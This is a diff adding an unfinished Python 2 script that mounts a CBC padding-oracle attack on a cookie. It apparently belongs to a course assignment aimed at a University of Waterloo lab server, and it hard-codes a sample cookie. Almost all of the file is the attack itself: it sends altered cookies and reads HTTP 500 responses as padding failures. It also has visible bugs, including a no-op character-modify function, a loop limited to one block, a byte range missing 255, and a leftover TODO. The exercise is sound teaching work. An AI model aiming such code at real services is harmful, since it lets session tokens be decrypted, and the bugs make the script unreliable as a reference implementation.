@@ -1,0 +1,123 @@
+#!/usr/bin/env python
+
+import base64
+import httplib2
+import os
+import sys
+
+# Defaults
+BLOCK_LEN = 16
+URL = "http://ugster21.student.cs.uwaterloo.ca:4555/"
+COOKIE = "38UNph4moFFIGSxwCXpQO38JqNfjCcwK2iqhzQGjogipGx1QaEpv4+mwrS5sr+gt+whL4kC6Z7Y4zJQ8ITjm0g=="
+rand_r =  "\x00"+os.urandom(4)+"\x00"
+ 
+# Check if cookie was passed in, other use default
+if( len(sys.argv) == 2 ):
+	COOKIE = sys.argv[1]
+	print sys.argv[1]
+
+h = httplib2.Http(".cache")
+# Cookie: an unencoded cookie
+def GETwithCookie( cookie ):
+	cookie = base64.b64encode(cookie)
+	return h.request(URL, "GET", headers={ "Cookie" : "user=" + cookie })
+
+# Used to hit the ugster server for the first time
+def visitURL():
+	return h.request(URL, "GET")
+
+# Check if unecnoded cookie provided has valid padding
+def oracle( cookie ):
+	resp, content = GETwithCookie(cookie)
+	if( resp.status == 500):
+		return False
+	else:
+		return True
+
+def modifyChar(index, str, newChar):
+	s = list(str)
+	s[index] = s[index]
+	return "".join(s)
+
+
+def last_word_oracle():
+	s = base64.b64decode(COOKIE)
+	numOfBlocks = (len(COOKIE)/16) - 1
+	decoded_data = []
+
+	iv = s[0:16]
+
+	# Loop over cookie, specifically the ciphertext which is all after 1st block
+	#Skip first block which is IV
+	for i in range(1, 2): # numOfBlocks
+		# 16 byte array that will store IV
+		r = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+		key = bytearray(r)
+
+		y = bytearray( s[ (i*16) : (i+1)*16 ] )
+
+		for r_len in reversed( range(0, len(r)) ):
+			# print "Deal with next r[{0}]".format(r_len)
+			for r_byte in range(0, 255):
+				r[r_len] = r_byte
+
+				# Concat R|Y
+				ry = bytearray(r) + y
+
+				if oracle(ry):
+					# y has correct padding of unknown length	
+					# Determine padding size. All blocks have at least \x01 padding so start BLOCK_LEN-1
+					padding = 1
+
+					# Start looking from right to left
+					for n in reversed( range(0, BLOCK_LEN-2) ):
+						r_copy = list(r)
+						r_copy[n] ^= 0x01
+						
+						# Check if oracle says it is valid padding
+						if oracle( bytearray(r_copy) + y ):
+							# If oracle tells us it is valid, padding now tells us the padding size
+							# Stop
+
+							# Now we know the padding amount
+							# XOR all padding with n
+							# TODO	Dont do for now						
+							r[BLOCK_LEN-1] ^= padding
+
+							# print r
+							# print oracle(bytearray(r) + y)
+							decrypt_block = block_decrypt_oracle(padding, r, y)
+							break
+						else:
+							# We modified padding and it is now invalid
+							# Keep going
+							padding += 1
+							print "FAIL"
+					break
+			break
+
+def block_decrypt_oracle(padding, r, y):
+	inc = padding+1
+	for i in reversed(range(0, BLOCK_LEN-padding)):
+		r[BLOCK_LEN-1] ^= inc
+
+		for r_byte in range(0, 255):
+			r[i] = r_byte
+
+			ry = bytearray(r) + y
+			if oracle(ry):
+				# print i
+				# print r_byte
+				print "TRUE"
+				r[BLOCK_LEN-1] ^= inc
+				inc += 1
+				break
+	print bytearray(r)
+	print "END OF BDO"
+	return r
+
+
+
+
+last_word_oracle()
+	
